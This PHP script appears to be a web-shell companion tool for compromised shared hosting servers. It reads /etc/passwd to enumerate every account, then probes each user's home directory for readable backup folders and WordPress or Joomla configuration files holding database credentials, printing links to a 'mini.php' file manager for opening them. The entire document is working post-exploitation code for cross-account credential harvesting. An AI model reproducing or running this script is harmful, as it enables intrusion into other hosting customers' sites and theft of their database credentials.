<?php

error_reporting(0);
$list = scandir("/var/named");
foreach($list as $domain)
 if(strpos($domain,".db"))
  $domain = str_replace('.db','',$domain);
$etc = fopen('/etc/passwd', 'r');
while($passwd = fgets($etc)) {
 if($passwd == '' || !$etc) {
  echo "GAK BISA READ /etc/passwd :(";
 } else {
  preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
  foreach($user_jumping[1] as $usere) {
   $domain1 = "/home/".$usere."/tmp/cpbandwidth";
   $path = "/home/".$usere."/fantastico_backups";
   if(is_readable($path)) {
    echo "_".$usere."_ <font color='orange'>[1]<a href='/mini.php?path=$path' target='_blank'><u>Click Here</u></a></font> ~ <font color='orange'>[1]<a href='/mini.php?path=$domain1' target='_blank'><u>domain</u></a></font><br>";
   }
   $path2 = "/home/".$usere."/scriptupdate";
   if(is_readable($path2)) {
    echo "_".$usere."_ <font color='orange'>[2]<a href='/mini.php?path=$path2' target='_blank'><u>Click Here</u></a></font> ~ <font color='orange'>[2]<a href='/mini.php?path=$domain1' target='_blank'><u>domain</u></a></font><br>";
   }
   $path3 = "/home/".$usere."/backups";
   if(is_readable($path3)) {
    echo "_".$usere."_ <font color='orange'>[3]<a href='/mini.php?path=$path3' target='_blank'><u>Click Here</u></a></font> ~ <font color='orange'>[3]<a href='/mini.php?path=$domain1' target='_blank'><u>domain</u></a></font><br>";
   }
   $path4 = "/home/".$usere."/migration";
   if(is_readable($path4)) {
    echo "_".$usere."_ <font color='orange'>[4]<a href='/mini.php?path=$path4' target='_blank'><u>Click Here</u></a></font> ~ <font color='orange'>[4]<a href='/mini.php?path=$domain1' target='_blank'><u>domain</u></a></font><br>";
   }
   $path5 = "/home/".$usere."/public_html.bak";
   if(is_readable($path5)) {
    echo "_".$usere."_ <font color='orange'>[5]<a href='/mini.php?path=$path5' target='_blank'><u>Click Here</u></a></font> ~ <font color='orange'>[5]<a href='/mini.php?path=$domain1' target='_blank'><u>domain</u></a></font><br>";
   }
   $path6 = "/home/".$usere."/backup";
   if(is_readable($path6)) {
    echo "_".$usere."_ <font color='orange'>[6]<a href='/mini.php?path=$path6' target='_blank'><u>Click Here</u></a></font> ~ <font color='orange'>[6]<a href='/mini.php?path=$domain1' target='_blank'><u>domain</u></a></font><br>";
   }
   $path7 = "/home/".$usere."/public_html.backup/";
   if(is_readable($path7)) {
    echo "_".$usere."_ <font color='orange'>[7]<a href='/mini.php?path=$path7' target='_blank'><u>Click Here</u></a></font> ~ <font color='orange'>[7]<a href='/mini.php?path=$domain' target='_blank'><u>domain</u></a></font><br>";
   }
   $pathfile1 = "/home/".$usere."/configuration.php";
   if(is_readable($pathfile1)) {
    echo "_".$usere."_ <font color='orange'>[joomla]<a href='/mini.php?filesrc=$pathfile1&dir=$domain' target='_blank'><u>Click Here</u></a></font><br>";
   }
   $pathfile2 = "/home/".$usere."/wp-config.php";
   if(is_readable($pathfile2)) {
    echo "_".$usere."_ <font color='orange'>[wp]<a href='/mini.php?filesrc=$pathfile2&dir=$domain' target='_blank'><u>Click Here</u></a></font><br>";
   }
   $pathfile3 = "/home/".$usere."/.wp-config.php";
   if(is_readable($pathfile3)) {
    echo "_".$usere."_ <font color='orange'>[wp1]<a href='/mini.php?filesrc=$pathfile3&dir=$domain' target='_blank'><u>Click Here</u></a></font><br>";
   }
   $pathfile4 = "/home/".$usere."/.configuration.php";
   if(is_readable($pathfile4)) {
    echo "_".$usere."_ <font color='orange'>[joomla1]<a href='/mini.php?filesrc=$pathfile4&dir=$domain' target='_blank'><u>Click Here</u></a></font><br>";
   }
   $path8 = "/home/".$usere."/wordpress/";
   if(is_readable($path8)) {
    echo "_".$usere."_ <font color='orange'>[8]<a href='/mini.php?path=$path8' target='_blank'><u>Click Here</u></a></font> ~ <font color='orange'>[8]<a href='/mini.php?path=$domain' target='_blank'><u>domain</u></a></font><br>";
   }
   $path9 = "/home/".$usere."/wp_backup";
   if(is_readable($path9)) {
    echo "_".$usere."_ <font color='orange'>[9]<a href='/mini.php?path=$path9' target='_blank'><u>Click Here</u></a></font> ~ <font color='orange'>[9]<a href='/mini.php?path=$domain' target='_blank'><u>domain</u></a></font><br>";
   }
   $path10 = "/home/".$usere."/application_backups";
   if(is_readable($path10)) {
    echo "_".$usere."_ <font color='orange'>[10]<a href='/mini.php?path=$path10' target='_blank'><u>Click Here</u></a></font> ~ <font color='orange'>[10]<a href='/mini.php?path=$domain' target='_blank'><u>domain</u></a></font><br>";
   }
   $path11 = "/home/".$usere."/BCK-folder";
   if(is_readable($path11)) {
    echo "_".$usere."_ <font color='orange'>[11]<a href='/mini.php?path=$path11' target='_blank'><u>Click Here</u></a></font> ~ <font color='orange'>[11]<a href='/mini.php?path=$domain' target='_blank'><u>domain</u></a></font><br>";
   }
   $path12 = "/home/".$usere."/backupwordpress";
   if(is_readable($path12)) {
    echo "_".$usere."_ <font color='orange'>[12]<a href='/mini.php?path=$path12' target='_blank'><u>Click Here</u></a></font> ~ <font color='orange'>[12]<a href='/mini.php?path=$domain' target='_blank'><u>domain</u></a></font><br>";
   }
   $path13 = "/home/".$usere."/softaculous_backups";
   if(is_readable($path13)) {
    echo "_".$usere."_ <font color='orange'>[13]<a href='/mini.php?path=$path13' target='_blank'><u>Click Here</u></a></font> ~ <font color='orange'>[13]<a href='/mini.php?path=$domain' target='_blank'><u>domain</u></a></font><br>";
   }
  }
 }
}

?>
